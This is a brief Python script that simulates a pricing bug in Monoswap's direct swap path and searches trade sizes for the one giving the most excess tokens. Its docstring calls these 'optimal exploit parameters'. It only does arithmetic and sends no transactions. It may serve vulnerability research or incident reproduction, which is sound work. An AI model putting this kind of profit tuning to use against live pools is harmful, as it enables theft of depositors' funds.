#!/usr/bin/env python3
"""
Compute optimal exploit parameters for Monoswap direct swap bug.
Find the trade size that maximizes profit.
"""
P_in = 10**17
P_out = 10**18
B_out = 10000 * 10**18
V_out = B_out * P_out // 10**18

V_in_target = int(1.5 * V_out)
B_in = V_in_target * 10**18 // P_in

fees = 300

best_excess = 0
best_trade_pct = 0

print("Trade%  | AmountIn     | CP Output   | Bug Output  | Excess      | Excess%")
print("-" * 75)

for trade_pct in [0.1, 0.5, 1, 2, 5, 10, 20, 30, 40, 50]:
    trade_amount = int(B_in * trade_pct / 100)
    amountInWithFee = trade_amount * (100000 - fees) // 100000
    
    tokenInPrice = P_in * B_in // (B_in + amountInWithFee)
    avgInPrice = (P_in + 4 * tokenInPrice) // 5
    tradeVcashValue = avgInPrice * amountInWithFee // 10**18
    
    # CP
    amountOut_cp = tradeVcashValue * B_out // (tradeVcashValue + V_out)
    
    # Direct swap
    tokenOutPrice_cp = P_out * B_out // (B_out - amountOut_cp)
    directSwapOutPrice = P_in * P_out // tokenInPrice
    finalOutPrice = min(directSwapOutPrice, tokenOutPrice_cp)
    avgOutPrice = (P_out + 4 * finalOutPrice) // 5
    amountOut_final = tradeVcashValue * 10**18 // avgOutPrice
    
    excess = amountOut_final - amountOut_cp
    excess_pct = (excess / amountOut_cp) * 100
    
    print(f"{trade_pct:6.1f}% | {trade_amount/1e18:12.1f} | {amountOut_cp/1e18:11.4f} | {amountOut_final/1e18:11.4f} | {excess/1e18:11.4f} | {excess_pct:.2f}%")
    
    if excess > best_excess:
        best_excess = excess
        best_trade_pct = trade_pct

print()
print(f"Optimal trade size: {best_trade_pct:.1f}% of pool, excess = {best_excess/1e18:.4f} tokens")
